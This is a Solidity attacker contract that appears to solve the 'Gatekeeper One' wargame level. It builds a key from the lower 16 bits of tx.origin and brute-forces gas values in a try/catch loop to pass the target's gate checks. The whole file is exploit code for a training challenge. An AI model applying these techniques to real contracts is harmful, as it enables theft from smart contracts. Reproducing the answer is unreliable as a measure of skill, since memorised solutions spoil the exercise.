// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IGatekeeperOne {
    function enter(bytes8 _key) external returns (bool);
}

contract GatekeeperOneAttacker {
    error GatekeeperOneAttacker__InvalidAddress();

    IGatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOne) {
        if (_gatekeeperOne == address(0)) {
            revert GatekeeperOneAttacker__InvalidAddress();
        }
        gatekeeperOne = IGatekeeperOne(_gatekeeperOne);
    }

    function attack() external {
        // Get the lower 16 bits of tx.origin
        uint16 origin = uint16(uint160(tx.origin));
        // Build the key
        bytes8 key = bytes8(uint64(origin) | (uint64(1) << 63));

        uint256 gasMultiple = 8191;
        for (uint256 i = 0; i < gasMultiple; i++) {
            try gatekeeperOne.enter{gas: (gasMultiple * 100) + i}(key) {
                gatekeeperOne.enter{gas: (gasMultiple * 100) + i}(key);
            } catch {
                continue;
            }
        }
    }
}
